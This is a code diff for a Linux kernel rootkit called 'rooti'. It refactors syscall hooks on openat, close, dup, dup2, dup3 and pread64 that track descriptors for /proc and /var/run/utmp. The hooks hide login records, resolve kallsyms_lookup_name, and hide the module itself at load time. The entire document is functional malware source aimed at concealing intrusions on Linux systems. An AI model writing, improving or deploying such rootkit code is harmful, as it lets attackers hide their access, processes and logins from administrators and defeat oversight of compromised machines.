@@ -9,7 +9,6 @@
 #include <net/sock.h>
 #include <net/tcp.h>
 #include "hooking/utils.h"
-#include "hooking/init.h"
 #include "hooking/syscall.h"
 #include "hooking/func.h"
 #include "capabilities/privilege.h"
@@ -76,31 +75,31 @@ static asmlinkage long hook_openat(const struct pt_regs *regs)
 {
     // Allocate a kernel buffer to store the requested filename + null terminator
     char *filepath_user = (char *)regs->si;
-    char *filepath_kernel = kmalloc(NAME_MAX + 1, GFP_KERNEL);
+    char *filepath_kernel = kmalloc(PATH_MAX, GFP_KERNEL);
     if (filepath_kernel == NULL) {
         ROOTI_DEBUG("failed to allocate memory");
         return orig_openat(regs);
     }
 
     // Copy the requested filename to the kernel mode buffer
-    int len = strncpy_from_user(filepath_kernel, filepath_user, NAME_MAX);
+    int len = strncpy_from_user(filepath_kernel, filepath_user, PATH_MAX - 1);
     if (len < 0) {
         ROOTI_DEBUG("strncpy_from_user() failed: %d", len);
         kfree(filepath_kernel);
         return orig_openat(regs);
     }
-    filepath_kernel[NAME_MAX] = '\0';
+    filepath_kernel[PATH_MAX - 1] = '\0';
 
     // Invoke the original syscall
     int fd = orig_openat(regs);
     int err;
     
     // Check if the requested file to open is the /proc VFS directory
-    if (strncmp(filepath_kernel, "/proc", NAME_MAX) == 0) {
+    if (strncmp(filepath_kernel, "/proc", PATH_MAX) == 0) {
         err = rooti_track_fd(fd, &rooti_proc_tracked_fds);
     }
     // Check if the requested file to open is the utmp file storing login records
-    else if (strncmp(filepath_kernel, "/var/run/utmp", NAME_MAX) == 0) {
+    else if (strncmp(filepath_kernel, "/var/run/utmp", PATH_MAX) == 0) {
         err = rooti_track_fd(fd, &rooti_utmp_tracked_fds);
     }
 
@@ -110,17 +109,14 @@ static asmlinkage long hook_openat(const struct pt_regs *regs)
 
 static asmlinkage long hook_close(const struct pt_regs *regs)
 {
-    pid_t pid = current->pid;
     int fd = regs->di;
     struct rooti_tracked_fd *record;
-    struct rooti_tracked_fd *tmp;
 
     for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
-        // If present, remove the recorded FD
-        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
-            if (pid == record->pid && fd == record->fd) {
-                rooti_untrack_fd(record);
-            }
+        // Search for a tracking of this FD and if found, remove it
+        record = rooti_search_tracked_fd(fd, rooti_tracked_fds_lists[i]);
+        if (record != NULL) {
+            rooti_untrack_fd(record);
         }
     }
     return orig_close(regs);
@@ -128,19 +124,13 @@ static asmlinkage long hook_close(const struct pt_regs *regs)
 
 static asmlinkage long hook_dup(const struct pt_regs *regs)
 {
-    pid_t pid = current->pid;
     int oldfd = regs->di;
     int newfd = orig_dup(regs);
 
-    struct rooti_tracked_fd *record;
-    struct rooti_tracked_fd *tmp;
-
     for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
-        // If present, duplicate the recorded FD
-        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
-            if (pid == record->pid && oldfd == record->fd) {
-                rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
-            }
+        // If the old descriptor is tracked, the new one should also be tracked
+        if (rooti_is_tracked_fd(oldfd, rooti_tracked_fds_lists[i])) {
+            rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
         }
     }
     return newfd;
@@ -148,19 +138,13 @@ static asmlinkage long hook_dup(const struct pt_regs *regs)
 
 static asmlinkage long hook_dup2(const struct pt_regs *regs)
 {
-    pid_t pid = current->pid;
     int oldfd = regs->di;
     int newfd = orig_dup2(regs);
 
-    struct rooti_tracked_fd *record;
-    struct rooti_tracked_fd *tmp;
-
     for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
-        // If present, duplicate the recorded FD
-        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
-            if (pid == record->pid && oldfd == record->fd) {
-                rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
-            }
+        // If the old descriptor is tracked, the new one should also be tracked
+        if (rooti_is_tracked_fd(oldfd, rooti_tracked_fds_lists[i])) {
+            rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
         }
     }
     return newfd;
@@ -168,38 +152,29 @@ static asmlinkage long hook_dup2(const struct pt_regs *regs)
 
 static asmlinkage long hook_dup3(const struct pt_regs *regs)
 {
-    pid_t pid = current->pid;
     int oldfd = regs->di;
     int newfd = orig_dup3(regs);
 
-    struct rooti_tracked_fd *record;
-    struct rooti_tracked_fd *tmp;
-
     for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
-        // If present, duplicate the recorded FD
-        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
-            if (pid == record->pid && oldfd == record->fd) {
-                rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
-            }
+        // If the old descriptor is tracked, the new one should also be tracked
+        if (rooti_is_tracked_fd(oldfd, rooti_tracked_fds_lists[i])) {
+            rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
         }
     }
     return newfd;
 }
 
 static asmlinkage long hook_pread64(const struct pt_regs *regs) {
-    pid_t pid = current->pid;
     int fd = regs->di;
-    size_t count = regs->dx;
     char *user_buf = (char *)regs->si;
-
+    size_t count = regs->dx;
+    
     // Invoke the original syscall
     size_t nread = orig_pread64(regs);
 
-    struct rooti_tracked_fd *record;
-    list_for_each_entry(record, &rooti_utmp_tracked_fds, head)  {
-        if (pid == record->pid && fd == record->fd) {
-            rooti_hide_login_entry(user_buf, count);
-        }
+    // Is this a read of /var/utmp?
+    if (rooti_is_tracked_fd(fd, &rooti_utmp_tracked_fds)) {
+        rooti_hide_login_entry(user_buf, count);
     }
     return nread;
 }
@@ -284,10 +259,11 @@ struct rooti_func_hook func_hooks[] = {
 static int __init rooti_init(void)
 {
     ROOTI_DEBUG("init");
-    
-    int ret = rooti_hooking_init();
+
+    // Resolves the address of kallsyms_lookup_name for later use
+    int ret = rooti_resolve_kln_addr();
     if (ret < 0) {
-        ROOTI_DEBUG("rooti_hooking_init() failed: %d", ret);
+        ROOTI_DEBUG("rooti_resolve_kln_addr() failed: %d", ret);
         return ret;
     }
 
@@ -325,7 +301,9 @@ static int __init rooti_init(void)
 
     // If configured to be hidden by default, hide this rootkit
 #ifndef ROOTI_DEBUG_SHOWME
-    rooti_hideme();
+    ret = rooti_hideme();
+    if (ret < 0)
+        return ret;
 #endif
 
     return 0;
